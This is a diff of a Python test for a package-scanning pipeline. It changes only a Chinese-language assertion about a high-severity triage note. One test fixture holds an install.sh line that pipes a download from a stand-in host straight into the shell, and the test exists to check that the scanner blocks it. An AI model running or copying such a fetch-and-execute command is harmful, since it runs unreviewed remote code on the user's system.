@@ -630,7 +630,7 @@ class PipelineTests(unittest.TestCase):
         record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
         _card, pipeline = self.place([record])
         self.assertEqual(self.summary(pipeline), ("static", "blocked", ["triage", "forget"]))
-        self.assertIn("高嚴重度旗標待分流", pipeline["note_zh"])
+        self.assertIn("高嚴重度旗標待你分流", pipeline["note_zh"])
         flag = next(f["id"] for f in record["flags"] if f["severity"] == "high")
         toxic = [{"food": "a", "kind": "triage", "flag": flag, "outcome": "confirm-toxic", "reason": "r"}]
         _card, pipeline = self.place([record], toxic)
